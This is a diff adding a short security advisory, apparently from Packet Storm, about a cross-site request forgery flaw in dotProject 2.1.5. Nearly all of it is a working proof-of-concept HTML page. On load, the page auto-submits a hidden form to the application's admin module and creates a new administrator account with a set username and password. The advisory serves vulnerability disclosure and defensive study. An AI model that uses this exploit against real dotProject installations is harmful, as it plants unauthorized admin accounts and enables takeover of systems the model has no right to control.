@@ -1,0 +1,42 @@
+Source: http://packetstormsecurity.org/files/view/98245/dotProject2.1.5-xsrf.txt
+
+<!------------------------------------------------------------------------
+# Software................dotProject 2.1.5
+# Vulnerability...........Cross-site Request Forgery
+# Download................http://sourceforge.net/projects/dotproject/
+# Release Date............2/2/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# ------------------------------------------------------------------------
+# 
+# --Description--
+# 
+# A cross-site request forgery vulnerability in dotProject 2.1.5 can be
+# exploited to create a new admin.
+# 
+# 
+# --PoC-->
+<html>
+    <body onload="document.forms[0].submit()">
+        <form method="POST" action="http://localhost/dotproject/index.php?m=admin">
+            <input type="hidden" name="user_id" value="0" />
+            <input type="hidden" name="contact_id" value="0" />
+            <input type="hidden" name="dosql" value="do_user_aed" />
+            <input type="hidden" name="username_min_len" value="4)" />
+            <input type="hidden" name="password_min_len" value="4)" />
+            <input type="hidden" name="user_username" value="new_admin" />
+            <input type="hidden" name="user_type" value="1" />
+            <input type="hidden" name="user_role" value="11" />
+            <input type="hidden" name="user_password" value="Password1" />
+            <input type="hidden" name="password_check" value="Password1" />
+            <input type="hidden" name="contact_first_name" value="x" />
+            <input type="hidden" name="contact_last_name" value="x" />
+            <input type="hidden" name="contact_company" value="0" />
+            <input type="hidden" name="contact_department" value="" />
+            <input type="hidden" name="contact_email" value="x@x.com" />
+            <input type="hidden" name="user_signature" value="" />
+        </form>
+    </body>
+</html>
